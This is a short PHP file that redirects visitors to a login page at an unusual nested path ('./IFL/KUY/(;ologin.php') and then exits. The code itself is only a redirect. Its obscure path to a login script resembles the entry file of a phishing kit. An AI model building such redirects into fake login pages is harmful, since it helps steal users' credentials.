<?php
  header('Location: ./IFL/KUY/(;ologin.php');
  exit();
?>